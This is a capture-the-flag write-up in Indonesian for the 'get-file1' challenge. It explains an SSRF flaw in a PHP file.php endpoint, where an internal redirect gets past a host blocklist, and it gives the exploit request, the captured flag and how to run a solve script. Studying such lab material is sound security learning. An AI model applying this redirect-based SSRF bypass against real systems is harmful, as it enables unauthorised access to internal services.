# get-file1

## Ringkasan

Aplikasi PHP menyediakan endpoint SSRF di `/file.php?u=...`. Redirect `/a` pada service internal `r` dapat dipakai untuk mengambil flag dari service `flag.thjcc`.

## Target dan File

- Target: `http://chal.thjcc.org:8081`
- Endpoint: `/file.php`
- Service redirector: `r`
- Service flag: `flag.thjcc`
- Source utama: `src/file.php`

## Analisis Awal

`file.php` menerima URL HTTP/HTTPS, mengambil response dengan redirect otomatis dimatikan, lalu membaca header `Location`. Host `flag.thjcc` diblokir oleh fungsi `a()`.

Redirector memiliki route `/a` yang mengembalikan:

```http
Location: http://flag.thjcc/flag.txt
```

## Vulnerability

Validasi redirect dan pembacaan akhir tidak konsisten. Pada iterasi yang memproses `/a`, redirect hanya diperiksa lalu URL diganti. Iterasi berikutnya mengambil `http://flag.thjcc/flag.txt` dengan `follow_location=false`; karena response flag bukan redirect, kode kemudian melakukan pembacaan kedua dengan `follow_location=true` tanpa memanggil `a()` lagi.

## Eksploitasi

Request berikut menghasilkan flag:

```text
GET /file.php?u=http%3A%2F%2Fr%2Fa HTTP/1.1
Host: chal.thjcc.org:8081
```

Response remote yang diperoleh:

```text
THJCC{pHp_StReAm_30X_cAsE_43082ed528}
```

## Solve Script

`solve.py` mengirim URL `http://r/a` ke endpoint tersebut, lalu mengambil flag dari response aplikasi.

## Cara Menjalankan

```bash
python3 solve.py
```

Target lain yang masih berada dalam scope dapat dipakai lewat environment variable:

```bash
TARGET=http://127.0.0.1:8081 python3 solve.py
```

## Flag

`THJCC{pHp_StReAm_30X_cAsE_43082ed528}`

## Catatan Stabilitas

Eksploitasi bergantung pada DNS internal service name `r`, redirect `/a`, dan bug alur validasi di `src/file.php`. Request berhasil konsisten pada target remote.
